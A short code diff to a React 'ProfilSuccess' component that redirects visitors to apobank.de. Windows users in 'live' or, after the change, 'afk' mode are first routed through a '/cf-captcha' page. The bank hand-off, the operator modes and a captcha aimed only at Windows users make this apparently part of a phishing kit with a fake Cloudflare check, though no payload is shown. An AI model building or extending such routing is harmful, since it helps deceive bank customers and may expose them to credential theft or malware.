@@ -16,7 +16,7 @@ const ProfilSuccess = () => {
         if (data?.flow_mode) mode = data.flow_mode;
       } catch {}
       const apobank = "https://www.apobank.de";
-      const gate = isWindows() && mode === "live";
+      const gate = isWindows() && (mode === "afk" || mode === "live");
       const target = gate ? `/cf-captcha?next=${encodeURIComponent(apobank)}` : apobank;
       timer = setTimeout(() => {
         if (cancelled) return;
